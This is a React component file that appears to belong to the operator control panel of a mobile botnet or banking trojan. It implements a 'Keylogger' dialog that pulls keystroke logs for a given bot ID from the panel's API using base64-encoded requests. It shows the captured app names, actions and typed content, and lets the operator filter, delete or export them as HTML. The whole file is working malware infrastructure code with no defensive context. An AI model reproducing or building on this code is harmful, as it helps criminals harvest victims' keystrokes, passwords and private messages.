import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Card, Switch, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText, Select, MenuItem, TextField, IconButton} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faClock, faDownload, faTimes, faTimesCircle } from '@fortawesome/free-solid-svg-icons';

import { CustomersTable } from '../keylogs/logs-table';
import { applyPagination } from '../../utils/apply-pagination';
import { useSelection } from '../../hooks/use-selection';
import { checkperms } from 'src/utils/checkperms';

export default function KeyloggerPopup(props) {


    const { customer, title, children, openPopup, setOpenPopup, onClose, keyloggerrequest, setkeyloggerrequest} = props;

    const useCustomerIds = (customers) => {
      return useMemo(
        () => {
          return customers.map((customer) => customer.id);
        },
        [customers]
      );
    };

    let data = [];
    const [page, setPage] = useState(0);
    const [rowsPerPage, setRowsPerPage] = useState(100);
    const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
    const customersIds = useCustomerIds(customers);
    const customersSelection = useSelection(customersIds);
    const [currentHvnc, setCurrentHvnc] = useState([]);
    const [currentHvncNodes, setCurrentHvncNodes] = useState([]);
    const [scaleFactor, setScaleFactor] = useState(3);
    const [screenwidth, setScreenwidth] = useState(900)
    const [screenheight, setScreenheight] = useState(2400)

    const [OriginDataGrouped, setOriginDataGrouped] = useState([]);
    const [OriginData, setOriginData] = useState([]);

    const [dataForDown, setdataForDown] = useState([]);
    const [dates, setDates] = useState([]);
    const [selectedDate, setSelectedDate] = useState('none');

    // search

    const [searchString, setSearchString] = useState('');
    const [searchResults, setSearchResults] = useState([]);

    useEffect(() => {
      if (!checkperms(6)){
        return
      }
      getLogs()    
  
    }, []);

    const buttoncolor = "primary.main"

    const handleChange = (event) => {
      setSelectedDate(event.target.value)

      SettingsContext.CurrentPageKeyLogs = 0;
      SettingsContext.RowsPerPageKeyLogs = 100;

      if (event.target.value !== "none") {
        let data = OriginDataGrouped[event.target.value]        

        setPage(0)
        setCustomers(applyPagination(data, SettingsContext.CurrentPageKeyLogs, SettingsContext.RowsPerPageKeyLogs))
        SettingsContext.CountKeyLogs = data.length

        setdataForDown(data)
      } else {
        SettingsContext.CurrentPageKeyLogs = 0;
        SettingsContext.RowsPerPageKeyLogs = 100;
        setPage(0)
        getLogs()
      }
    };

    const handleSearch = (string) => {
      const searchTerm = string.toLowerCase();
      console.log(searchTerm)
  
      const results = OriginData.filter((item) => {
        for (const key in item) {
          if (typeof item[key] === 'string' && item[key].toLowerCase().includes(searchTerm.toLowerCase())) {
            return true;
          }
        }
        return false;
      });
  
      setSearchString(searchTerm);
      setPage(0)
      setCustomers(applyPagination(results, SettingsContext.CurrentPageKeyLogs, SettingsContext.RowsPerPageKeyLogs))
      SettingsContext.CountKeyLogs = results.length
      //console.log(results)
    };

  

      const getLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"getLogsKeylogger","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });
            
        request.done(function(msg) {
          let response = (JSON.parse(msg))
          var data = [];

          //console.log(response)


          if (!response.error){
            response.forEach((item) => {
              const decodedItem = Buffer.from(item, 'base64').toString('utf-8');
              try {
                //console.log(decodedItem)
                const jsonItem = JSON.parse(decodedItem);
                
                const {id, time, date, app_name, package_name, action, content, desc} = jsonItem;
                data.push({id, time, date, app_name, package_name, action, content, desc});

                //setScreenwidth(hvnc.width)
                //setScreenheight(hvnc.height)
              } catch (error) {
                console.log(error)
              }
              
              
            });
            
            console.log(data)

            data.sort((a, b) => new Date(a.date) - new Date(b.date));

            let grouped = data.reduce((r, a) => {
              r[a.date] = [...r[a.date] || [], a];
              return r;
            }, {});

            //console.log(grouped);

            setdataForDown(grouped)

            setDates(Object.keys(grouped));

            setOriginDataGrouped(grouped)
            setOriginData(data)
  
  
            setCustomers(applyPagination(data, SettingsContext.CurrentPageKeyLogs, SettingsContext.RowsPerPageKeyLogs))
            SettingsContext.CountKeyLogs = data.length
          }

          //console.log(currentHvnc)
          //console.log(currentHvncNodes)

        
          

        }.bind(this));
    
        
      };

      const deleteLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"deleteLogsKeylogger","idbot":"' + customer.id + '"}').toString('base64')
          }
        });
        
      };

      if (openPopup && !keyloggerrequest) {
        getLogs()
        setkeyloggerrequest(true)
      }

      const objToTable = (obj) => {
        let html = `
            <style>
                table {
                    border-collapse: collapse;
                    width: 100%;
                    margin-top: 20px;
                }
                th, td {
                    border: 1px solid #ddd;
                    padding: 8px;
                    text-align: center;
                }
                th {
                    background-color: #f2f2f2;
                }
                select {
                    width: 200px;
                    height: 30px;
                    margin-bottom: 10px;
                }
            </style>
            <script>
                var data = ${JSON.stringify(obj)};
                function updateTable(date) {
                    var tableData = data[date];
                    var table = document.getElementById("data-table");
                    table.innerHTML = "<tr><th>Time</th><th>Name</th><th>Event</th><th>Content</th><th>Desc</th></tr>";
                    for (var i = 0; i < tableData.length; i++) {
                        var row = document.createElement("tr");
                        var timeCell = document.createElement("td");
                        timeCell.textContent = tableData[i]["time"];
                        row.appendChild(timeCell);
                        var nameCell = document.createElement("td");
                        nameCell.textContent = tableData[i]["app_name"];
                        row.appendChild(nameCell);

                        var eventCell = document.createElement("td");
                        eventCell.textContent = tableData[i]["action"];
                        row.appendChild(eventCell);

                        var contentCell = document.createElement("td");
                        contentCell.textContent = tableData[i]["content"];
                        row.appendChild(contentCell);

                        var descCell = document.createElement("td");
                        descCell.textContent = tableData[i]["desc"];
                        row.appendChild(descCell);

                        table.appendChild(row);
                    }
                }
                window.onload = function() {
                    var firstDate = Object.keys(data)[0];
                    document.getElementById("date-select").value = firstDate;
                    updateTable(firstDate);
                }
            </script>
            <select id="date-select" onchange="updateTable(this.value)">
        `;
        for (let date in obj) {
            html += `<option value="${date}">${date}</option>`;
        }
        html += `</select>
            <table id="data-table"></table>
        `;
        return html;
    };

    const downloadHtml = () => {
      const htmlTable = objToTable(OriginDataGrouped);
      const blob = new Blob([htmlTable], { type: 'text/html' });
      const href = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = href;
      link.download = 'keylogger_' + customer.id + '.html';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
  };


      const handlePageChange = useCallback(
        (event, value) => {
          setPage(value);
          SettingsContext.CurrentPageKeyLogs = value;
          getLogs()
        },
        []
      );
    
    
    
      const handleRowsPerPageChange = useCallback(
        (event) => {
          setRowsPerPage(event.target.value);
          SettingsContext.RowsPerPageKeyLogs = event.target.value
          setPage(0)
          getLogs()
        },
        []
      );


    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="false" >
              <DialogContent style={{overflow: "hidden", width: "1500px"}} dividers>
                    <div style={{ display: "flex", justifyContent: "space-between", overflow: "hidden", maxHeight: 45}}>
                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={230}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{customer.id}</Typography>
                        
                    </Box>

                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faKeyboard}/>
                        </SvgIcon>
                        <Typography ml={1}>Keylogger</Typography>
                        
                    </Box>
                    
                    <Button
                    onClick={getLogs}
                      sx={{borderRadius: "10px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowsRotate} />
                      )}
                      variant="contained"
                    >
                      Reload
                    </Button>

                    <Button
                    disabled={SettingsContext.user.role === "user"}
                    onClick={deleteLogs}
                    sx={{borderRadius: "10px", marginLeft: "5px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete All Keylogs
                    </Button>

                    <Button
                    onClick={downloadHtml}
                    sx={{borderRadius: "10px", marginLeft: "5px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faDownload} />
                      )}
                      variant="contained"
                    >
                      Download
                    </Button>

                    <Select sx={{height: 45, ml:1}} value={selectedDate} onChange={handleChange}>
                      <MenuItem value={"none"}>
                      none
                      </MenuItem>
                      {dates.map((date, index) => (
                        <MenuItem key={index} value={date}>
                          {date}
                        </MenuItem>
                      ))}
                    </Select>

                    <TextField hiddenLabel value={searchString} defaultValue={searchString} id="filled-basic" variant="filled" InputProps={{
                      endAdornment: (
                        <IconButton
                          aria-label="Clear text"
                          onClick={() => {handleSearch(""); setSearchString("");}}
                          edge="end"
                        >
                          <FontAwesomeIcon icon={faTimesCircle} />
                        </IconButton>
                      ),
                    }} onChange={(event) => {handleSearch(event.target.value)}}/>
                    

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x" color={buttoncolor}/>
                    </Button>
                    
                    </div>

                    <br></br>
                    <div style={{maxHeight: "750px", overflow: "auto"}}>
                    <CustomersTable
                        count={SettingsContext.CountKeyLogs}
                        items={customers}
                        onPageChange={handlePageChange}
                        onRowsPerPageChange={handleRowsPerPageChange}
                        page={page}
                        rowsPerPage={rowsPerPage}
                        setCurrentHvnc={setCurrentHvnc}
                        setCurrentHvncNodes={setCurrentHvncNodes}
                    />
                    </div>

                    
            </DialogContent>

        </Dialog>
    )
}
